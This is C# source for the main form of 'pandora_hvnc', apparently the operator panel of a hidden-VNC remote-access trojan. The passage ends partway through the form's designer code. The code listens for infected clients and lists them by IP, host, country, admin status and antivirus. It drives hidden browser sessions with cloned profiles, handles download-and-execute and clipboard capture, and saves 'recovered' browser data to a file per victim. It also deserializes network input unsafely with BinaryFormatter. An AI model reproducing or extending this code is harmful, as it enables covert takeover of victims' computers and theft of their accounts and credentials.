using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	public class FrmMain : Form
	{
		public static List<TcpClient> _clientList;

		public static TcpListener _TcpListener;

		private Thread VNC_Thread;

		public static int SelectClient;

		public static bool bool_1;

		public static int int_2;

		public static string isadmin;

		public static string detecav;

		public static Random random = new Random();

		public static string PandoraRecoveryResults;

		public int count;

		public static bool ispressed = false;

		private IContainer components;

		private ImageList imageList1;

		private Guna2Panel guna2Panel1;

		private Guna2ResizeBox guna2ResizeBox1;

		private ContextMenuStrip contextMenuStrip1;

		private ToolStripMenuItem testToolStripMenuItem;

		public StatusStrip statusStrip1;

		private ToolStripStatusLabel ClientsOnline;

		private Panel panel1;

		private ToolStripMenuItem HVNCListenBtn;

		private ToolStripMenuItem portToolStripMenuItem;

		private ToolStripTextBox HVNCListenPort;

		private ToolStripSeparator toolStripSeparator3;

		private Guna2DragControl guna2DragControl1;

		private ImageList imageList2;

		private Guna2NumericUpDown ListenPort;

		private Label StatusPort;

		private Guna2ToggleSwitch StartPort;

		private ColumnHeader columnHeader1;

		private ColumnHeader columnHeader2;

		private ColumnHeader columnHeader3;

		private ColumnHeader columnHeader4;

		private ColumnHeader columnHeader5;

		private ColumnHeader columnHeader6;

		private ColumnHeader columnHeader7;

		private ColumnHeader columnHeader8;

		private ColumnHeader columnHeader9;

		public ListView HVNCList;

		private ColumnHeader columnHeader10;

		private ToolStripMenuItem toolStripMenuItem1;
        private ToolStripMenuItem resetScaleToolStripMenuItem;
        private ToolStripMenuItem uRLHiddenToolStripMenuItem;
        private ToolStripMenuItem killChromeToolStripMenuItem;
        private ToolStripMenuItem updateExecuteToolStripMenuItem;
        private ToolStripStatusLabel toolStripStatusLabel1;
        private System.Windows.Forms.Timer timer1;
        private ToolStripMenuItem builderToolStripMenuItem;
        private ToolStripSeparator toolStripSeparator1;
        private ColumnHeader columnHeader11;

		public static string saveurl { get; set; }

		public static string MassURL { get; set; }

		public string xxhostname { get; set; }

		public string xxip { get; set; }

		public FrmMain()
		{
			InitializeComponent();
		}

		private void Listenning()
		{
			checked
			{
				try
				{
					_clientList = new List<TcpClient>();
					_TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(ListenPort.Text));
					_TcpListener.Start();
					_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (ex.Message.Contains("aborted"))
						{
							return;
						}
						IEnumerator enumerator = null;
						while (true)
						{
							try
							{
								try
								{
									enumerator = Application.OpenForms.GetEnumerator();
									while (enumerator.MoveNext())
									{
										Form form = (Form)enumerator.Current;
										if (form.Name.Contains("FrmVNC"))
										{
											form.Dispose();
										}
									}
								}
								finally
								{
									if (enumerator is IDisposable)
									{
										(enumerator as IDisposable).Dispose();
									}
								}
							}
							catch (Exception)
							{
								continue;
							}
							break;
						}
						bool_1 = false;
						HVNCListenBtn.Text = "Listen";
						int num = _clientList.Count - 1;
						for (int i = 0; i <= num; i++)
						{
							_clientList[i].Close();
						}
						_clientList = new List<TcpClient>();
						int_2 = 0;
						_TcpListener.Stop();
						ClientsOnline.Text = "Online: 0";
					}
					catch (Exception)
					{
					}
				}
			}
		}

		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat("0123456789", length)
				select s[random.Next(s.Length)]).ToArray());
		}

		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				_TcpListener.BeginAcceptTcpClient(ResultAsync, _TcpListener);
			}
			catch (Exception)
			{
			}
		}

		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int num = 8;
					int num2 = 0;
					while (num > 0)
					{
						int num3 = tcpClient.GetStream().Read(array, num2, num);
						num -= num3;
						num2 += num3;
					}
					ulong num4 = BitConverter.ToUInt64(array, 0);
					int num5 = 0;
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num6 = 0;
						int num7 = array2.Length;
						while (num7 > 0)
						{
							num5 = tcpClient.GetStream().Read(array2, num6, num7);
							num7 -= num5;
							num6 += num5;
						}
						memoryStream.Write(array2, 0, (int)num4);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[1] { "|" }, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", TextCompare: false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "654321", TextCompare: false) == 0)
								{
									string text;
									try
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										text = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										long num8 = 0L;
										IPAddress address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
										string text2 = new Ping().Send(address).RoundtripTime.ToString();
										ListViewItem lvi2 = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											text2
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((MethodInvoker)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi2);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
									catch (Exception)
									{
										ListViewItem lvi = new ListViewItem(new string[10]
										{
											" " + text,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											"N/A"
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										HVNCList.Invoke((MethodInvoker)delegate
										{
											lock (_clientList)
											{
												HVNCList.Items.Add(lvi);
												HVNCList.Items[int_2].Selected = true;
												_clientList.Add(tcpClient);
												int_2++;
												ClientsOnline.Text = "Online: " + Conversions.ToString(int_2);
												GC.Collect();
											}
										});
									}
								}
								else if (_clientList.Contains(tcpClient))
								{
									GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
							}
							catch (Exception)
							{
							}
						}
						else if (_clientList.Contains(tcpClient))
						{
							GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, ReadResult, tcpClient);
				}
				catch (Exception ex3)
				{
					if (!ex3.Message.Contains("disposed"))
					{
						try
						{
							if (_clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											Invoke((MethodInvoker)delegate
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											});
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								HVNCList.Invoke((MethodInvoker)delegate
								{
									lock (_clientList)
									{
										try
										{
											int index = _clientList.IndexOf(tcpClient);
											_clientList.RemoveAt(index);
											HVNCList.Items.RemoveAt(index);
											tcpClient.Close();
											int_2--;
											ClientsOnline.Text = "Online: " + Conversions.ToString(int_2);
										}
										catch (Exception)
										{
										}
									}
								});
							}
							return;
						}
						catch (Exception)
						{
							return;
						}
					}
					tcpClient.Close();
				}
			}
		}

		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			int hashCode = tcpClient_0.GetHashCode();
			FrmVNC frmVNC = (FrmVNC)Application.OpenForms["VNCForm:" + Conversions.ToString(hashCode)];
			if (object_2 is Bitmap)
			{
				frmVNC.VNCBoxe.Image = (Image)object_2;
			}
			else
			{
				if (!(object_2 is string))
				{
					return;
				}
				string[] array = Conversions.ToString(object_2).Split('|');
				string left = array[0];
				if (Operators.CompareString(left, "0", TextCompare: false) == 0)
				{
					frmVNC.VNCBoxe.Tag = new Size(Conversions.ToInteger(array[1]), Conversions.ToInteger(array[2]));
				}
				if (Operators.CompareString(left, "200", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "201", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Chrome initiated successfully!";
				}
				if (Operators.CompareString(left, "202", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "203", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Firefox initiated successfully!";
				}
				if (Operators.CompareString(left, "204", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "205", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Edge initiated successfully!";
				}
				if (Operators.CompareString(left, "206", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave initiated with cloned profile successfully!";
				}
				if (Operators.CompareString(left, "207", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Brave successfully started !";
				}
				if (Operators.CompareString(left, "256", TextCompare: false) == 0)
				{
					try
					{
						frmVNC.FrmTransfer0.FileTransferLabele.Text = "Downloaded successfully ! | Executed...";
					}
					catch (Exception)
					{
					}
				}
				if (Operators.CompareString(left, "22", TextCompare: false) == 0)
				{
					try
					{
						frmVNC.FrmTransfer0.int_0 = Conversions.ToInteger(array[1]);
						frmVNC.FrmTransfer0.DuplicateProgesse.Value = Conversions.ToInteger(array[1]);
					}
					catch (Exception)
					{
					}
				}
				if (Operators.CompareString(left, "23", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.DuplicateProfile(Conversions.ToInteger(array[1]));
				}
				if (Operators.CompareString(left, "24", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = "Copy successfully !";
				}
				if (Operators.CompareString(left, "25", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "26", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				Operators.CompareString(left, "719", TextCompare: false);
				if (Operators.CompareString(left, "2555", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2556", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "2557", TextCompare: false) == 0)
				{
					frmVNC.FrmTransfer0.FileTransferLabele.Text = array[1];
				}
				if (Operators.CompareString(left, "3307", TextCompare: false) == 0)
				{
					Clipboard.SetText(array[1].ToString());
				}
				if (Operators.CompareString(left, "3308", TextCompare: false) == 0)
				{
					if (!Directory.Exists(Directory.GetCurrentDirectory() + "\\pandora_hvncRecovery"))
					{
						Directory.CreateDirectory("pandora_hvncRecovery");
					}
					PandoraRecoveryResults = array[1].ToString();
					if (!PandoraRecoveryResults.Contains("System"))
					{
						File.WriteAllText(Directory.GetCurrentDirectory() + "\\pandora_hvncRecovery\\" + xxip + "_" + xxhostname + "_pandora_hvncRecovery.txt", PandoraRecoveryResults);
					}
					GC.Collect();
				}
			}
		}

		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (HVNCList.FocusedItem.Index == -1)
					{
						return;
					}
					int num = Application.OpenForms.Count - 1;
					while (true)
					{
						if (num >= 0)
						{
							if (Application.OpenForms[num].Tag == _clientList[HVNCList.FocusedItem.Index])
							{
								break;
							}
							num += -1;
							continue;
						}
						FrmVNC frmVNC = new FrmVNC();
						frmVNC.Name = "VNCForm:" + Conversions.ToString(_clientList[HVNCList.FocusedItem.Index].GetHashCode());
						frmVNC.Tag = _clientList[HVNCList.FocusedItem.Index];
						string text = HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
							.Replace("}", null)
							.Replace(":", null)
							.Remove(0, 1);
						string text2 = HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
							.Replace("}", null)
							.Replace(":", null)
							.Remove(0, 1);
						frmVNC.Text = text + ":" + text2;
						frmVNC.ClientRecoveryLabel.Text = text + ":" + text2;
						frmVNC.Show();
						return;
					}
					Application.OpenForms[num].Show();
				}
				catch (Exception)
				{
					MessageBox.Show("You have to select a client first!", "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			e.DrawDefault = true;
		}

		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			if (!e.Item.Selected)
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			if (e.Item.Selected)
			{
				e.Graphics.FillRectangle(new SolidBrush(Color.FromArgb(50, 50, 50)), e.Bounds);
				TextRenderer.DrawText(e.Graphics, e.SubItem.Text, new Font("Segoe UI", 9f, FontStyle.Regular, GraphicsUnit.Point), checked(new Point(e.Bounds.Left + 3, e.Bounds.Top + 2)), Color.White);
			}
			else
			{
				e.DrawDefault = true;
			}
		}

		private void HVNCListenBtn_Click_1(object sender, EventArgs e)
		{
			if (Operators.CompareString(StatusPort.Text, "Enable Port", TextCompare: false) == 0)
			{
				StatusPort.Text = "Disable Port";
				HVNCListenBtn.Image = imageList2.Images[0];
				HVNCListenPort.Enabled = false;
				VNC_Thread = new Thread(Listenning)
				{
					IsBackground = true
				};
				bool_1 = true;
				VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			while (true)
			{
				try
				{
					try
					{
						enumerator = Application.OpenForms.GetEnumerator();
						while (enumerator.MoveNext())
						{
							Form form = (Form)enumerator.Current;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				catch (Exception)
				{
					continue;
				}
				break;
			}
			HVNCListenPort.Enabled = true;
			VNC_Thread.Abort();
			bool_1 = false;
			StatusPort.Text = "Enable Port";
			HVNCListenBtn.Image = imageList2.Images[1];
			HVNCList.Items.Clear();
			_TcpListener.Stop();
			checked
			{
				int num = _clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					_clientList[i].Close();
				}
				_clientList = new List<TcpClient>();
				int_2 = 0;
				ClientsOnline.Text = "Online: 0";
			}
		}

		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
		}

		private void FrmMain_Load(object sender, EventArgs e)
		{
			HVNCList.Columns[1].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[2].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[3].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[4].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[5].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[6].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[7].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[8].TextAlign = HorizontalAlignment.Center;
			HVNCList.Columns[9].TextAlign = HorizontalAlignment.Center;
			HVNCList.View = View.Details;
			HVNCList.HideSelection = false;
			HVNCList.OwnerDraw = true;
			HVNCList.BackColor = Color.FromArgb(34,34,34);
			HVNCList.DrawColumnHeader += delegate(object sender1, DrawListViewColumnHeaderEventArgs args)
			{
				Brush brush = new SolidBrush(Color.FromArgb(34, 34, 34));
				args.Graphics.FillRectangle(brush, args.Bounds);
				TextRenderer.DrawText(args.Graphics, args.Header.Text, args.Font, args.Bounds, Color.WhiteSmoke);
			};
			HVNCList.DrawItem += delegate(object sender1, DrawListViewItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			HVNCList.DrawSubItem += delegate(object sender1, DrawListViewSubItemEventArgs args)
			{
				args.DrawDefault = true;
			};
			ClientsOnline.Text = "Online: 0";
		}




		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			HVNCListenBtn.PerformClick();
		}


		private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			Environment.Exit(Environment.ExitCode);
		}

		private void StartPort_CheckedChanged_1(object sender, EventArgs e)
		{
			if (StartPort.Checked)
			{
				ListenPort.Enabled = false;
			}
			else if (!StartPort.Checked)
			{
				ListenPort.Enabled = true;
			}
		}

		private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			
		}





		public void browserRecoveryToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (HVNCList.SelectedItems.Count == 0)
			{
				MessageBox.Show("You have to select a client first! ", "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				return;
			}
			FrmVNC frmVNC = new FrmVNC();
			foreach (object selectedItem in HVNCList.SelectedItems)
			{
				_ = selectedItem;
				count = HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(HVNCList.SelectedItems[i].GetHashCode());
				object tag = HVNCList.SelectedItems[i].Tag;
				string xip = HVNCList.SelectedItems[i].SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				string xhostname = HVNCList.SelectedItems[i].SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null)
					.Replace("}", null)
					.Replace(":", null)
					.Remove(0, 1);
				xxip = xip;
				xxhostname = xhostname;
				frmVNC.xip = xip;
				frmVNC.xhostname = xhostname;
				frmVNC.Tag = tag;
				frmVNC.PandoraRecovery();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + count, "pandora_hvnc", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(FrmMain));
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.guna2Panel1 = new Guna.UI2.WinForms.Guna2Panel();
            this.guna2ResizeBox1 = new Guna.UI2.WinForms.Guna2ResizeBox();
            this.ClientsOnline = new System.Windows.Forms.ToolStripStatusLabel();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.contextMenuStrip1 = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.testToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripMenuItem1 = new System.Windows.Forms.ToolStripMenuItem();
            this.resetScaleToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.uRLHiddenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killChromeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.updateExecuteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.builderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(this.components);
            this.panel1 = new System.Windows.Forms.Panel();
            this.ListenPort = new Guna.UI2.WinForms.Guna2NumericUpDown();
            this.StatusPort = new System.Windows.Forms.Label();
            this.StartPort = new Guna.UI2.WinForms.Guna2ToggleSwitch();
            this.imageList2 = new System.Windows.Forms.ImageList(this.components);
            this.HVNCList = new System.Windows.Forms.ListView();
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader5 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader7 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader6 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader8 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader9 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader10 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader11 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.HVNCListenBtn = new System.Windows.Forms.ToolStripMenuItem();
            this.portToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.HVNCListenPort = new System.Windows.Forms.ToolStripTextBox();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.statusStrip1.SuspendLayout();
            this.contextMenuStrip1.SuspendLayout();
            this.panel1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ListenPort)).BeginInit();
            this.SuspendLayout();
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Black;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
